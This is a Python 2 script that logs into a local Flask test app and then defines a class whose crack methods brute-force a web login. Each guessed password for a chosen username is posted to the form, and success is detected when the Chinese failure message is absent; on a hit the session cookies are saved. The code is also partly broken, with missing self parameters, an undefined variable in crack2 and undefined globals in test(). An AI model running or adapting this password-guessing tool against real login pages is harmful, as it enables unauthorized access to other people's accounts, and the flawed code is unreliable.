#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_flask.py

import urllib
import urllib2
import cookielib
import time
import re

url = "http://127.0.0.1:5000"
url_login = url + "/login"

user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
headers = {'User-Agent':user_agent}
values = {'username':'admin', 'password':'admin', }
datas = urllib.urlencode(values)

cookiejar = cookielib.MozillaCookieJar('/tmp/cookie_scxh1.txt')
cookieproc = urllib2.HTTPCookieProcessor(cookiejar)
opener = urllib2.build_opener(cookieproc)
req = urllib2.Request(url=url_login, data=datas, headers=headers)

try:
    response = opener.open(req)
except (urllib2.HTTPError, urllib2.URLError),e:
    print e

page = response.read()

"""
----right-content:-----
<i>Welcome,</i>
  <b>admin</b> <a href="/logout">logout</a>
----wrong-content:-----
"Invalid username/password, try again!"
"""
m = re.search("Welcome.*admin", page)
if m:
    print response.headers
else:
    print "No cookie"

class Auth_Cookie():
    def __init__(self, user_agent, cookie_file, url, username):
        client_headers = {'User-Agent':user_agent}
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        self.req = urllib2.Request(url, client_headers)
        self.user_crack = username

    def pre_read():
        pass

    def make_cookie():
        pass

    def crack(self, pwd_list):
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({
                    'userName': self.user_crack,
                    'password': key1,
                    })
            try:
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR", e
                return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                respon_uni = unicode(response_html, 'gb18030')
                case = respon_uni.encode('utf-8').find('用户登陆失败')
                if case != -1:
                    #print "false.....", key1
                    pass
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return "good luck"
            return "error"

    def crack2(self, pwd):
        pwd_encode = urllib.urlencode({
                'userName': self.user_crack,
                'password': pwd,
                })
        try:
            response = self.opener.open(self.req, pwd_encode)
        except urllib2.HTTPError, e:
            print "at opener.open, raise ERROR", e
            return
        response_resu = response.getcode()
        if response_resu == 200:
            response_html = response.read()
            #怎么样判断是通过验证，标志是***用户登陆失败***
            respon_uni = unicode(response_html, 'gb18030')
            case = respon_uni.encode('utf-8').find('用户登陆失败')
            if case != -1:
                #print "false.....", key1
                return
            else:
                print time.ctime(), " Find The Key: ", key1
                self.cookiejar.save()
                print "good luck"
                exit(0)

    def __iter__(self):
        return self

    def next(self, pwd_list):
        for tmp in pwd_list:
            resu = self.crack(tmp)
        return resu


    def test():
        global aaa1
        s11 = Auth_Cookie(agent11, file11, url11, 'scbh001')
        aaa1 = s11.crack(pwd11)
